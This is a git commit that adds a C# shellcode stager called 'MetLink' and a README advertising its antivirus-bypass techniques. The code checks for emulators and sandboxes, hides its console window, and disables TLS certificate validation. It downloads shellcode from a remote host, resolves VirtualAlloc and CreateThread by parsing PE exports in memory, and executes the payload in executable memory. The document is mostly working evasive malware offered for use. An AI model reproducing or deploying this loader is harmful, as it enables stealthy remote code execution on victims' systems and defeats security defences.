a60304048e51b0a60855aa635bf2e43ae808872b
ImaginaryBIT <chenxiaogeng925@gmail.com>
2021-04-29 13:06:30 +0800

    Update readme

---
+++ Dinvoke_inject/Program.cs
@@ -0,0 +1,177 @@
+﻿using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Net;
+
+
+namespace MetLinkD
+{
+
+    public class Program
+    {
+        [DllImport("kernel32")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        [DllImport("kernel32")]
+        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern IntPtr FlsAlloc(IntPtr callback);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            DateTime t1 = DateTime.Now;
+            Sleep(2000);
+            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+            if (t2 < 2) { return; }
+
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null) { return; }
+
+            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
+            if (ptrCheck == null) { return; }
+
+            string host = "https://192.168.101.129";
+            string port = "443";
+            string path = "/wdJbPNkg3tFF5UTnJW90igB8SMiobjiNC7crjqKgwxwTch4VeM5iXVHB3ZELJG9ASP2H3M7AzjadK31ipE2dObPgSK4OpifdLpLphjaQgtISYO8NUw7Ysgs5_Ei7V6y5Imi_maGGzSXnbY-x3Fpta7_Wcl8In2wVvuF4wiCq6HyvnCTFZ34YvQD7zVALlwGFOS";
+
+            string url = host + ":" + port + path;
+            Connection(url);
+        }
+
+        public static void Connection(string url)
+        {
+            try
+            {
+                const int SW_HIDE = 0;
+                var handle = GetConsoleWindow();
+
+                ShowWindow(handle, SW_HIDE);
+
+                WebClient webconnection = new WebClient();
+                webconnection.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+                ServicePointManager.Expect100Continue = true;
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
+
+                byte[] shellcode = webconnection.DownloadData(url);
+
+                var pointer = Generic.GetLibraryAddress("kernel32.dll", "VirtualAlloc");
+                var virtualAlloc = Marshal.GetDelegateForFunctionPointer(pointer, typeof(VirtualAlloc)) as VirtualAlloc;
+                var alloc = virtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000 | 0x2000, 0x40);
+
+                Marshal.Copy(shellcode, 0, alloc, shellcode.Length);
+
+                IntPtr threatHandle = IntPtr.Zero;
+
+                pointer = Generic.GetLibraryAddress("kernel32.dll", "CreateThread");
+                var createThread = Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateThread)) as CreateThread;
+                threatHandle = createThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, IntPtr.Zero);
+
+                WaitForSingleObject(threatHandle, 0xFFFFFFFF);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine("[Error]" + e.Message);
+            }
+        }
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    }
+
+    public class Generic
+    {
+        public static IntPtr GetLibraryAddress(string DLLName, string FunctionName, bool CanLoadFromDisk = false)
+        {
+            IntPtr hModule = GetLoadedModuleAddress(DLLName);
+
+            return GetExportAddress(hModule, FunctionName);
+        }
+
+        public static IntPtr GetLoadedModuleAddress(string DLLName)
+        {
+            ProcessModuleCollection ProcModules = Process.GetCurrentProcess().Modules;
+            foreach (ProcessModule Mod in ProcModules)
+            {
+                if (Mod.FileName.ToLower().EndsWith(DLLName.ToLower()))
+                {
+                    return Mod.BaseAddress;
+                }
+            }
+            return IntPtr.Zero;
+        }
+
+        public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName)
+        {
+            IntPtr FunctionPtr = IntPtr.Zero;
+            try
+            {
+                // Traverse the PE header in memory
+                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+                Int64 pExport = 0;
+                if (Magic == 0x010b)
+                {
+                    pExport = OptHeader + 0x60;
+                }
+                else
+                {
+                    pExport = OptHeader + 0x70;
+                }
+
+                // Read -> IMAGE_EXPORT_DIRECTORY
+                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+
+                // Loop the array of export name RVA's
+                for (int i = 0; i < NumberOfNames; i++)
+                {
+                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase))
+                    {
+                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                        break;
+                    }
+                }
+            }
+            catch
+            {
+                // Catch parser failure
+                throw new InvalidOperationException("Failed to parse module exports.");
+            }
+
+            if (FunctionPtr == IntPtr.Zero)
+            {
+                // Export not found
+                throw new MissingMethodException(ExportName + ", export not found.");
+            }
+            return FunctionPtr;
+        }
+
+    }
+}
--- README.md
+++ README.md
@@ -1,1 +1,8 @@
-"# MetLink_DInvoke" 
+# MetLink
+Implemented few AV bypass techniques
+- Custom stager
+- TLS Encryption
+- Emulator detection
+- Dynamic Invocation
+
+![alt text](./antiscan.me.png)
